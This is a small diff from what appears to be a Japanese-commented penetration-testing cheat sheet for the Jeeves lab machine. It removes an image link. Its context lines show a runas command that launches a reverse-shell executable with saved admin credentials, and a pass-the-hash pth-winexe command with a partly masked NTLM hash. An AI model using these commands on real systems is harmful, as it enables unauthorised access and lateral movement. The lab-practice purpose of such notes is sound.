@@ -63,5 +63,3 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 ### Pass the Hash
 #何らかの手段でハッシュを取得する場合は、psexec、smbexecを使用し、別のユーザーとしてシェルを取得します。
 pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
-
-![image](https://github.com/user-attachments/assets/cceca783-ab36-48dc-8eaa-4438e6e7788f)
